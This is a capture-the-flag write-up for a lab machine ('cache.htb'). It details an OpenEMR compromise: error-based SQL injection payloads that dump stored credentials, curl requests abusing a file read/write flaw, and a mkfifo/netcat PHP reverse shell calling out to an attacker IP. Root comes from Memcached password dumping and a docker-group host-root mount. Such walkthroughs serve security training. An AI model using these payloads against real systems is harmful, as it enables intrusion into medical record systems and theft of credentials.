# Summary
- User: OpenEMR vulnerabilies allowing for unauthenticated SQL injection followed by authenticated remote file creation resulting in a reverse shell
- Root: access Memcache to retrieve stored password, switch to user who is member of docker group, and spin up an image with the root directory mounted to it

# Details
### User: 9685c3e24ae419b4a1b4f1d6a43abc32
- Nmap scan reveals ports 22 and 80 are open
- `functionality.js` file contains local login check for `username: ash` and `password: H@v3_fun`
- `cache.htb/author.html` page mentions "HMS(Hospital Management System)", leading to the discovery of alternate `hms.htb` domain hosting an OpenEMR portal that is vulnerable to several exploits
    - Exploit: https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
- visiting `hms.htb/portal/account/register.php` sets two session variables (`pid` and `patient_portal_onsite_two`) that allow for SQL injection on several different pages, one of which is `hms.htb/portal/find_appt_popup_user.php?catid=1' < injection >`
    - POC: `hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -`
- OpenEMR database structure contains a table named `users_secure` that holds user authentication credentials
    - username: `hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT((SELECT username FROM users_secure),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -`
        - `openemr_admin`
    - password: `hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT((SELECT password FROM users_secure),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -`
        - `$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.`
- cracking password with `john` reveals it to be `xxxxxx` and allows logging in to OpenEMR interface with `username: openemr_admin` and `password: xxxxxx`
- logging in as `openemr_admin` enables arbitrary file access exploit
    - Exploit: `/usr/share/exploitdb/exploits/linux/webapps/45202.txt`
    - POC: `curl -b "OpenEMR=vqkpfcd8lvmp064vipo4819md1;PHPSESSID=68jbgc5f01khrm9ekd7danov4m" -d "mode=get&docid=/etc/passwd" http://hms.htb/portal/import_template.php`
- setup listener, upload PHP reverse shell, and trigger it
    - `curl -b "OpenEMR=vqkpfcd8lvmp064vipo4819md1;PHPSESSID=68jbgc5f01khrm9ekd7danov4m" -d "mode=save&docid=../services/neko.php&content=<?php exec('rm -f neko; mkfifo neko; cat neko | /bin/sh -i 2>%261 | nc 10.10.14.41 9405 > neko'); ?>" http://hms.htb/portal/import_template.php`
- use `su` to log in as `ash` with `H@v3_fun` password from earlier

### Root: 9d934c54c58a2ac01ef42282d336289e
- use `/dev/shm` to download enumeration scripts
- enumeration reveals Memcached running on port 11211
- use `telnet 127.0.0.1 11211` to connect to server on localhost and dump keys, retrieving `0n3_p1ec3` password for use with `luffy`
    - `stats items`, view key counts
    - `stats cachedump 1 5`, view key names
    - `get passwd`, get passwd key value
- after switching to `luffy` user, `id` reveals they are part of the `docker` group which means they can run an image and mount any local directory inside it, including the root directory
    - `docker image ls`, check for local images
    - `docker run -v /:/mnt -it ubuntu /bin/bash`, run Ubuntu image and mount local root directory inside, giving access to flag
